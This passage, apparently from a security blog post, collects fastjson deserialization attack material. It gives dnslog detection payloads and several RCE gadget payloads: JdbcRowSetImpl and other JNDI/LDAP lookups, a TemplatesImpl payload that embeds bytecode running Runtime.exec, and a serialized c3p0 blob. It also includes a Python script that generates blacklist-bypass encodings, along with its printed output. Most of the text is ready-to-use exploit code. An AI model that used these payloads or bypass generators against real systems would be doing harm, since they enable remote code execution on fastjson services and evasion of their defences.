let's use dnslog.
##### dnslog detect
At the present, fastjson detection is common to detect by dnslog mode, in
which Inet4Address and Inet6Address are available until 1.2.67. Here are some
payloads to be seen (combined with the rand: {} method above, which is more
general):
    {"rand1":{"@type":"java.net.InetAddress","val":"http://dnslog"}}
    {"rand2":{"@type":"java.net.Inet4Address","val":"http://dnslog"}}
    {"rand3":{"@type":"java.net.Inet6Address","val":"http://dnslog"}}
    {"rand4":{"@type":"java.net.InetSocketAddress"{"address":,"val":"http://dnslog"}}}
    {"rand5":{"@type":"java.net.URL","val":"http://dnslog"}}
    Some malformed payloads, but can still trigger dnslog:
    {"rand6":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}
    {"rand7":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}
    {"rand8":Set[{"@type":"java.net.URL","val":"http://dnslog"}
    {"rand9":{"@type":"java.net.URL","val":"http://dnslog"}:0
#### Some RCE Payload
I didn't collect the payload about fastjson before, and I didn't run the jar
package .... The following lists are the payloads circulated on the network
and some of them deducted from marshalsec and transformed into a payload
suitable for fastjson. The jdk version for each payload will not be tested one
by one, I don't know how much time it takes to test this. The actual use
basically can't be know in this version, whether autotype is turned on or not,
the user's configuration, and the user added the blacklist/white or not. so
just pass the constructed payload one by one. The basic payload:
    payload1:
    {
      "rand1": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://localhost:1389/Object",
        "autoCommit": true
      }
    }
    payload2:
    {
      "rand1": {
        "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "_bytecodes": [
          "yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ"
        ],
        "_name": "aaa",
        "_tfactory": {},
        "_outputProperties": {}
      }
    }
    payload3:
    {
      "rand1": {
        "@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
        "properties": {
          "data_source": "ldap://localhost:1389/Object"
        }
      }
    }
    payload4:
    {
      "rand1": {
        "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
        "targetBeanName": "ldap://localhost:1389/Object",
        "propertyPath": "foo",
        "beanFactory": {
          "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
          "shareableResources": [
            "ldap://localhost:1389/Object"
          ]
        }
      }
    }
    payload5:
    {
      "rand1": Set[
      {
        "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
        "beanFactory": {
          "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
          "shareableResources": [
            "ldap://localhost:1389/obj"
          ]
        },
        "adviceBeanName": "ldap://localhost:1389/obj"
      },
      {
        "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"
      }
    ]}
    payload6:
    {
      "rand1": {
        "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
        "userOverridesAsString": "HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;"
      }
    }
    payload7:
    {
      "rand1": {
        "@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource",
        "jndiName": "ldap://localhost:1389/Object",
        "loginTimeout": 0
      }
    }
    ...and more
The following is a small script that can transfer the basic payload out of
various bypass variants, and also adds `\u`,`\x` encoding forms:
    #!usr/bin/env python  
    # -*- coding:utf-8 -*-    """ 
    @author: longofo
    @file: fastjson_fuzz.py 
    @time: 2020/05/07 
    """
    import json
    from json import JSONDecodeError
    class FastJsonPayload:
        def __init__(self, base_payload):
            try:
                json.loads(base_payload)
            except JSONDecodeError as ex:
                raise ex
            self.base_payload = base_payload
        def gen_common(self, payload, func):
            tmp_payload = json.loads(payload)
            dct_objs = [tmp_payload]
            while len(dct_objs) > 0:
                tmp_objs = []
                for dct_obj in dct_objs:
                    for key in dct_obj:
                        if key == "@type":
                            dct_obj[key] = func(dct_obj[key])
                        if type(dct_obj[key]) == dict:
                            tmp_objs.append(dct_obj[key])
                dct_objs = tmp_objs
            return json.dumps(tmp_payload)
        # Increase the value of @type by the beginning of L, the end of ;
        def gen_payload1(self, payload: str):
            return self.gen_common(payload, lambda v: "L" + v + ";")
        # Increase the value of @type by the beginning of LL, the end of ;;
        def gen_payload2(self, payload: str):
            return self.gen_common(payload, lambda v: "LL" + v + ";;")
        # Carry on the value of @type \u format
        def gen_payload3(self, payload: str):
            return self.gen_common(payload,
                                   lambda v: ''.join('\\u{:04x}'.format(c) for c in v.encode())).replace("\\\\", "\\")
        # Carry on the value of @type \x format
        def gen_payload4(self, payload: str):
            return self.gen_common(payload,
                                   lambda v: ''.join('\\x{:02x}'.format(c) for c in v.encode())).replace("\\\\", "\\")
        # Generate cache bypass payload
        def gen_payload5(self, payload: str):
            cache_payload = {
                "rand1": {
                    "@type": "java.lang.Class",
                    "val": "com.sun.rowset.JdbcRowSetImpl"
                }
            }
            cache_payload["rand2"] = json.loads(payload)
            return json.dumps(cache_payload)
        def gen(self):
            payloads = []
            payload1 = self.gen_payload1(self.base_payload)
            yield payload1
            payload2 = self.gen_payload2(self.base_payload)
            yield payload2
            payload3 = self.gen_payload3(self.base_payload)
            yield payload3
            payload4 = self.gen_payload4(self.base_payload)
            yield payload4
            payload5 = self.gen_payload5(self.base_payload)
            yield payload5
            payloads.append(payload1)
            payloads.append(payload2)
            payloads.append(payload5)
            for payload in payloads:
                yield self.gen_payload3(payload)
                yield self.gen_payload4(payload)
    if __name__ == '__main__':
        fjp = FastJsonPayload('''{
      "rand1": {
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "ldap://localhost:1389/Object",
        "autoCommit": true
      }
    }''')
        for payload in fjp.gen():
            print(payload)
            print()
For example JdbcRowSetImpl results:
    {"rand1": {"@type": "Lcom.sun.rowset.JdbcRowSetImpl;", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}
    {"rand1": {"@type": "LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}
    {"rand1": {"@type": "\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}
    {"rand1": {"@type": "\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}
    {"rand1": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}, "rand2": {"rand1": {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}}
    {"rand1": {"@type": "\u004c\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c\u003b", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}
    {"rand1": {"@type": "\x4c\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c\x3b", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}
    {"rand1": {"@type": "\u004c\u004c\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c\u003b\u003b", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}
    {"rand1": {"@type": "\x4c\x4c\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c\x3b\x3b", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}
    {"rand1": {"@type": "\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073", "val": "com.sun.rowset.JdbcRowSetImpl"}, "rand2": {"rand1": {"@type": "\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}}
    {"rand1": {"@type": "\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73", "val": "com.sun.rowset.JdbcRowSetImpl"}, "rand2": {"rand1": {"@type": "\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c", "dataSourceName": "ldap://localhost:1389/Object", "autoCommit": true}}}
Some people also scan maven warehouse packages to find malicious exploits to
conform jackson and fastjson. It seems that most of them are looking for jndi-type vulnerabilities. For the blacklist, you can look at this
[project](https://github.com/LeadroyaL/fastjson-blacklist), it ran to version
1.2.62, most blacklists ran out, but many were package, which specific class
still have to look for one by one in the package.
#### Reference
  1. 
  2. 
  3. 
  4. 
  5. 
  6. 
  7. 
  8. 
  9. 
  10. 
  11. 
  12. 
  13. <https://zhuanlan.zhihu.com/p/99075925
  14. ...
Too many, thanks all people for their hard work.
* * *